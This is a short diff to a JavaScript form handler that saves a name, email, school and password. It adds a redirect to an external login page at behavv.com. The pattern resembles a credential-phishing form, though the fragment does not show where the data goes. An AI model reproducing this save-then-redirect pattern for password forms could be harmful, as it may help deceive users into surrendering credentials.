@@ -42,6 +42,7 @@ function submitForm(e){
   
   saveMessage(fname,email, school, password);
 
+    location.replace("https://behavv.com/login.html")
   
 }
 
